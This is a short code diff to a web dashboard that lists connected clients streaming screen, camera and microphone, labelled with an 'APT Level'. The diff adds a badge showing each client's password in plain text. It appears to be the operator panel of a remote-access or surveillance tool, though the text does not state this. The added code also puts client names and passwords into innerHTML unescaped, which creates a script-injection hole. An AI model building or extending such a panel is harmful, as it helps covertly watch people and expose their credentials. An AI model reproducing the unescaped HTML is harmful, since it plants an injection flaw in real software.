@@ -131,12 +131,19 @@
                 const div = document.createElement('div');
                 div.className = 'client-card';
                 const typeLabel = client.type === 'all' ? '🎥 Screen + Camera + Mic' : (client.type === 'camera' ? '📷 Camera + Mic' : '🖥️ Screen Only');
+                
+                let passwordHtml = '';
+                if (client.password) {
+                    passwordHtml = `<div style="margin-top: 10px; background: #222; padding: 5px; border-radius: 4px; border: 1px solid #ffeb3b; color: #ffeb3b; font-family: monospace; font-size: 14px;">🔑 ${client.password}</div>`;
+                }
+
                 div.innerHTML = `
                     <h3>${client.name}</h3>
                     <p style="color: #bbb">${typeLabel}</p>
                     <p style="color: #ff9800; font-weight: bold; font-size: 14px;">🛠️ APT Level: ${client.apt || 'apt-1'}</p>
                     <p style="color: #17a2b8; font-size: 13px;">App Version: v${client.version || '1.0.0'}</p>
                     <p style="color: #28a745; font-weight: bold;">🟢 Online</p>
+                    ${passwordHtml}
                     <button onclick="event.stopPropagation(); forceStop('${client.id}')" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 4px; margin-top: 10px; cursor: pointer;">Turn Off Streams</button>
                 `;
                 div.onclick = () => watchClient(client.id, client.name, client.type);
